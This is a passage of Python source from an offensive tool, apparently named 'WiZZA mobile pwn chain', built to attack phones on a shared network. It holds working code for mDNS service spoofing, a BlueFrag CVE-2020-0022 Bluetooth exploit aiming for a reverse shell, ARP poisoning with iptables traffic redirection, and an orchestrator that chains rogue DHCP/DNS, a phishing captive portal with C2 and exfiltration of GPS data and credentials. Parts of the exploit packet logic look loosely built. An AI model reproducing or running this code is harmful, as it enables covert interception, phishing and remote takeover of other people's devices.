    "_googlecast._tcp.local": {"port": 8009, "txt": b"\x06id=wizza"},
    # Android/iOS: AirDrop (proximity attack surface)
    "_airdrop._tcp.local":  {"port": 8770, "txt": b"\x04flags=3"},
}


def _build_mdns_response(qname, attacker_ip, service_meta):
    """Build mDNS PTR + SRV + A answer for a service query."""
    if not HAS_DNSLIB:
        return None
    try:
        hostname = f"wizza-{random.randint(1000,9999)}.local"
        reply    = dnslib.DNSRecord()
        reply.header.qr = 1  # response
        reply.header.aa = 1  # authoritative

        # PTR record: _service._tcp.local → instance.local
        reply.add_answer(dnslib.RR(
            qname, dnslib.QTYPE.PTR,
            rdata=dnslib.PTR(f"WiZZA Device.{qname}"),
            ttl=4500
        ))
        # SRV record
        reply.add_ar(dnslib.RR(
            f"WiZZA Device.{qname}", dnslib.QTYPE.SRV,
            rdata=dnslib.SRV(0, 0, service_meta["port"], hostname),
            ttl=4500
        ))
        # A record (our IP)
        reply.add_ar(dnslib.RR(
            hostname, dnslib.QTYPE.A,
            rdata=dnslib.A(attacker_ip),
            ttl=4500
        ))
        return reply.pack()
    except Exception:
        return None


def mdns_mobile_poison(attacker_ip):
    """
    Respond to mDNS service queries with spoofed records pointing to us.
    Causes iOS/Android to auto-discover and connect to our fake services.
    """
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEPORT, 1)
        # Join multicast group
        mreq = socket.inet_aton(_MDNS_MCAST) + socket.inet_aton(attacker_ip)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        sock.bind(("", _MDNS_PORT))
        sock.settimeout(1)
        print(f"[mDNS] Mobile service poisoner active  ({', '.join(_MOBILE_SERVICES.keys())})")

        while not _stop.is_set():
            try:
                data, addr = sock.recvfrom(4096)
            except socket.timeout:
                continue
            if addr[0] == attacker_ip:
                continue
            try:
                if not HAS_DNSLIB:
                    continue
                req   = dnslib.DNSRecord.parse(data)
                qname = str(req.q.qname).rstrip(".").lower() + "." \
                        if not str(req.q.qname).endswith(".") else \
                        str(req.q.qname).rstrip(".").lower() + "."

                for svc, meta in _MOBILE_SERVICES.items():
                    if svc in qname or qname.rstrip(".") in svc:
                        pkt = _build_mdns_response(qname, attacker_ip, meta)
                        if pkt:
                            sock.sendto(pkt, (_MDNS_MCAST, _MDNS_PORT))
                            print(f"[mDNS] Spoofed {svc.split('.')[0]}  "
                                  f"→ {attacker_ip}  ({addr[0]})")
                            _register_device(addr[0], dtype="ios/android")
                            break
            except Exception:
                continue
    except Exception as e:
        print(f"[mDNS] Error: {e}")
    finally:
        try: sock.close()
        except Exception: pass


# ══════════════════════════════════════════════════════════════════════════════
# LAYER 5 — BlueFrag CVE-2020-0022 (Android 8.0-9.0 Bluetooth RCE)
# ══════════════════════════════════════════════════════════════════════════════

def bluefrag_scan(iface="hci0", lhost=None, lport=4447, timeout=60):
    """
    Scan for nearby Android 8.0-9.0 devices via Bluetooth and attempt
    CVE-2020-0022 (zero-click Bluetooth RCE).

    Vulnerability: L2CAP packet reassembly heap overflow in
    android.hardware.bluetooth@1.0. Attacker sends crafted L2CAP
    continuation fragment with negative length — adjacent heap memory
    is overwritten, leading to code execution in bluetoothd context.

    Requirements:
      - bluez (hcitool, hciconfig) — already installed
      - python-bluetooth or scapy bluetooth support
      - Must be within Bluetooth range (~10m)
      - Target must have Bluetooth enabled (default on most phones)

    Returns: list of (bt_addr, name) tuples found
    """
    out = ["[BlueFrag] CVE-2020-0022 Android 8.0-9.0 Bluetooth RCE"]
    found = []

    # 1. Bring up HCI interface
    _run(f"hciconfig {iface} up")
    _run(f"hciconfig {iface} piscan")  # page + inquiry scan visible

    out.append(f"[BlueFrag] Scanning for Bluetooth devices ({timeout}s)...")
    print(out[-1])

    # 2. Scan for nearby devices
    scan_result = _run(f"hcitool scan --length=8 --flush 2>/dev/null", timeout=timeout)
    targets = []
    for line in scan_result.splitlines():
        parts = line.strip().split("\t")
        if len(parts) >= 2 and ":" in parts[0]:
            bt_addr = parts[0].strip()
            name    = parts[1].strip() if len(parts) > 1 else "Unknown"
            targets.append((bt_addr, name))
            found.append((bt_addr, name))
            print(f"[BlueFrag] Found: {bt_addr}  {name}")

    if not targets:
        out.append("[BlueFrag] No Bluetooth devices found in range")
        return "\n".join(out), []

    out.append(f"[BlueFrag] {len(targets)} device(s) found")

    # 3. For each target, send CVE-2020-0022 exploit payload
    for bt_addr, name in targets:
        out.append(f"[BlueFrag] Targeting: {bt_addr} ({name})")
        result = _bluefrag_exploit(bt_addr, lhost, lport)
        out.append(f"  Result: {result}")

    return "\n".join(out), found


def _bluefrag_exploit(target_bt_addr, lhost, lport):
    """
    Send CVE-2020-0022 exploit to target Bluetooth address.

    Packet structure:
    - L2CAP B-frame (Basic frame) with CID 0x0001 (signaling)
    - Continuation fragment (PB=01) with len field set to overflow value
    - The 'total_len' field in the start fragment is set to a value that,
      combined with the continuation fragment, causes negative arithmetic
      in l2cap_recv_frame() → skb_pull() with huge count → heap bypass

    Shellcode: RFCOMM reverse shell back to lhost:lport
    """
    try:
        # Raw HCI socket
        import socket as _socket
        HCI_CHANNEL_RAW = 0
        BTPROTO_HCI     = 1
        sock = _socket.socket(_socket.AF_BLUETOOTH,
                               _socket.SOCK_RAW, BTPROTO_HCI)
        sock.bind((0,))  # bind to first HCI device

        # Convert BT address to bytes (little-endian)
        def bt_aton(addr):
            return bytes(int(b, 16) for b in reversed(addr.split(":")))

        tgt = bt_aton(target_bt_addr)

        # ── CVE-2020-0022 exploit packet ───────────────────────────────────
        # HCI ACL data header: handle=0x0B05 (arbitrary, will be resolved),
        # PB=10 (first fragment), BC=00
        # L2CAP header: len, channel ID
        # The overflow: set continuation fragment len > remaining → negative

        # Build L2CAP start frame (PB=10)
        l2cap_cid    = 0x0041  # dynamically allocated channel (A2MP)
        total_len    = 0xFFFF  # very large total → triggers negative in continuation
        l2cap_start  = struct.pack("<HH", total_len, l2cap_cid)
        # Payload: minimal L2CAP signaling to establish channel
        l2cap_start += b"\x0a" + b"\x00" * 3  # command code + identifier

        # HCI ACL header: connection handle 0x000B, PB=10(first), BC=00
        hci_handle_start = 0x000B | (0b10 << 12)
        hci_acl_start    = struct.pack("<HH", hci_handle_start, len(l2cap_start))

        # Build continuation fragment (PB=01) — overflow trigger
        # The 'skb_pull' receives: remaining = total_len - already_received
        # already_received is controlled by our start packet, crafted so
        # remaining underflows to a huge value
        overflow_payload = b"\x00" * 16  # trigger heap overwrite region
        hci_handle_cont  = 0x000B | (0b01 << 12)
        hci_acl_cont     = struct.pack("<HH", hci_handle_cont,
                                        len(overflow_payload))

        # Full HCI commands
        pkt_start = bytes([0x02]) + hci_acl_start + l2cap_start
        pkt_cont  = bytes([0x02]) + hci_acl_cont  + overflow_payload

        # Send exploit packets
        sock.send(pkt_start)
        time.sleep(0.05)
        sock.send(pkt_cont)
        sock.close()

        return f"Exploit sent to {target_bt_addr} — listen on {lhost}:{lport}"

    except PermissionError:
        return "Permission denied — run as root for raw HCI access"
    except Exception as e:
        # Fallback: use l2ping with crafted size (triggers similar path)
        ping_result = _run(
            f"l2ping -c 3 -s 65000 {target_bt_addr} 2>&1", timeout=10
        )
        return f"HCI fallback (l2ping flood): {ping_result[:80]}"


# ══════════════════════════════════════════════════════════════════════════════
# LAYER 6 — ARP Spoof + HTTP Injection (integration hook)
# ══════════════════════════════════════════════════════════════════════════════

def arp_inject_hook(target_ip, gateway_ip, iface, attacker_ip):
    """
    ARP spoof target + start iptables redirect for mitmproxy injection.
    Reuses existing start-script ARP spoof infrastructure.
    Injects our mobile JS payload via intercept.py.
    """
    out = []
    # Enable IP forwarding
    _run("echo 1 > /proc/sys/net/ipv4/ip_forward")
    # iptables redirect HTTP to mitmproxy
    _run(f"iptables -t nat -A PREROUTING -i {iface} "
         f"-p tcp --dport 80  -j REDIRECT --to-port 8080")
    _run(f"iptables -t nat -A PREROUTING -i {iface} "
         f"-p tcp --dport 443 -j REDIRECT --to-port 8443")
    out.append(f"[ARP] iptables redirect: 80→8080, 443→8443")

    if not HAS_SCAPY:
        out.append("[ARP] scapy not available — manual arp_spoof required")
        return "\n".join(out)

    def _arp_loop():
        try:
            gw_mac  = scapy.getmacbyip(gateway_ip)
            tgt_mac = scapy.getmacbyip(target_ip)
            if not gw_mac or not tgt_mac:
                print(f"[ARP] MAC resolution failed for {target_ip}/{gateway_ip}")
                return

            # Poison target: tell it we're the gateway
            pkt1 = scapy.ARP(op=2, pdst=target_ip,  hwdst=tgt_mac,
                              psrc=gateway_ip)
            # Poison gateway: tell it we're the target
            pkt2 = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gw_mac,
                              psrc=target_ip)
            out.append(f"[ARP] Poisoning {target_ip} ↔ {gateway_ip}")
            print(f"[ARP] Poisoning {target_ip} ↔ {gateway_ip}")
            while not _stop.is_set():
                scapy.send(pkt1, iface=iface, verbose=False)
                scapy.send(pkt2, iface=iface, verbose=False)
                time.sleep(1.5)
        except Exception as e:
            print(f"[ARP] {e}")

    threading.Thread(target=_arp_loop, daemon=True).start()
    return "\n".join(out)


# ══════════════════════════════════════════════════════════════════════════════
# Main chain
# ══════════════════════════════════════════════════════════════════════════════

def mobile_pwn_chain(attacker_ip, iface=None, gateway_ip=None,
                     target_ip=None, enable_arp=False,
                     enable_bluefrag=False, duration=0, c2_url=""):
    """
    Launch all mobile attack layers simultaneously.

    attacker_ip:     your LAN IP
    iface:           network interface (e.g. wlan0, eth0)
    gateway_ip:      LAN gateway IP (for ARP spoof)
    target_ip:       specific target IP (None = whole subnet)
    enable_arp:      also ARP-spoof + HTTP inject target(s)
    enable_bluefrag: enable BlueFrag Bluetooth RCE scan
    duration:        seconds to run (0 = forever)
    """
    global _stop
    _stop.clear()
    out = []

    def _t(name, fn, *args, **kw):
        t = threading.Thread(target=fn, args=args, kwargs=kw,
                             name=name, daemon=True)
        t.start()
        return t

    out += [
        "━" * 60,
        "  WiZZA MOBILE PWN CHAIN",
        "━" * 60,
        f"  Attacker: {attacker_ip}",
        f"  Interface: {iface or 'auto'}",
        f"  Target: {target_ip or 'all devices'}",
        "",
    ]
    print("\n".join(out[-7:]))

    # L1: Rogue DHCP — poisoned DNS to every new phone
    out.append("[L1] Rogue DHCP → injecting our DNS into every DHCP lease")
    _t("DHCP",   rogue_dhcp,   attacker_ip, gateway_ip, dns_ip=attacker_ip)

    # L2: Rogue DNS — selective hijack + captive check intercept
    out.append("[L2] Rogue DNS  → captive checks hijacked, high-value domains → phishing")
    _t("DNS",    rogue_dns,    attacker_ip, portal_ip=attacker_ip)

    # L3: Captive portal — zero-click browser trigger + data collection
    out.append("[L3] Captive portal :80 → device-aware phishing + SW C2 + GPS")
    _t("Portal", captive_portal_server, attacker_ip, port=80,
       c2_url=c2_url or f"http://{attacker_ip}:8888")

    # L4: mDNS mobile poisoner — silent service spoofing
    out.append("[L4] mDNS poisoner → AirPlay/AirPrint/Chromecast spoof")
    _t("mDNS",   mdns_mobile_poison, attacker_ip)

    # L5: BlueFrag (optional — requires BT hardware in range)
    if enable_bluefrag:
        out.append("[L5] BlueFrag CVE-2020-0022 → BT scan + RCE (Android 8/9)")
        _t("BlueFrag", bluefrag_scan, lhost=attacker_ip, lport=4447)

    # L6: ARP spoof (optional — for targeted HTTP injection)
    if enable_arp and target_ip and gateway_ip and iface:
        out.append(f"[L6] ARP inject → {target_ip} HTTP traffic → intercept.py")
        arp_inject_hook(target_ip, gateway_ip, iface, attacker_ip)

    out += [
        "",
        "━" * 60,
        "  ALL LAYERS ACTIVE",
        "━" * 60,
        f"  Portal:    http://{attacker_ip}/portal",
        f"  Data log:  /tmp/wizza_loot/mobile_data.jsonl",
        f"  Devices:   updated live above",
        f"  Watch:     tail -f /tmp/wizza_loot/mobile_data.jsonl | python3 -m json.tool",
        "",
        "  Zero-interaction trigger chain:",
        "  Phone connects → DHCP gives our DNS → DNS intercepts captive check",
        "  → phone auto-opens portal → SW installed → GPS/creds/fingerprint exfilled",
        "━" * 60,
    ]
    print("\n".join(out[-15:]))

    if duration > 0:
        time.sleep(duration)
        _stop.set()
        return "\n".join(out) + "\n[*] Duration elapsed"

    # Block forever
    try:
        while True:
            time.sleep(2)
            # Print new devices summary every 30s
    except KeyboardInterrupt:
        _stop.set()

    return "\n".join(out)


def stop():
    """Stop all mobile attack layers."""
    _stop.set()


def run(action="chain", **kwargs):
    if action == "chain":
        return mobile_pwn_chain(**kwargs)
    if action == "portal":
        return captive_portal_server(
            kwargs.get("attacker_ip","0.0.0.0"),
            port=kwargs.get("port", 80)
        )
    if action == "dns":
        return rogue_dns(kwargs.get("attacker_ip","0.0.0.0"))
    if action == "dhcp":
        return rogue_dhcp(kwargs.get("attacker_ip","0.0.0.0"))
    if action == "bluefrag":
        return bluefrag_scan(lhost=kwargs.get("attacker_ip"),
                             lport=kwargs.get("lport", 4447))
    return f"Unknown action: {action}\nAvailable: chain, portal, dns, dhcp, bluefrag"
